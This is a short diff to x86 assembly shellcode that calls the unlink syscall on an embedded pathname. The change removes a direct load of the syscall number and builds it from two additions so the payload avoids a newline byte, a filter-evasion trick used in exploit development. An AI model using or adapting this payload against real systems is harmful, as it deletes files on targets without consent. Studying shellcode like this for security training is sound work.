@@ -16,7 +16,8 @@
 	xorl	%eax,%eax		/* get a 32-bit zero value */
 	movb	%al,(STRLEN)(%esi)	/* null-terminate our string */
 
-	movb	$SYS_unlink,%al		/* syscall arg 1: syscall number */
+        add     $5, %al                 /* avoid 10 or '\n' (newline) */
+        add     $5, %al                 /* avoid 10 or '\n' (newline) */
 	movl	%esi,%ebx		/* syscall arg 2: string pathname */
 	int	$0x80			/* invoke syscall */
 
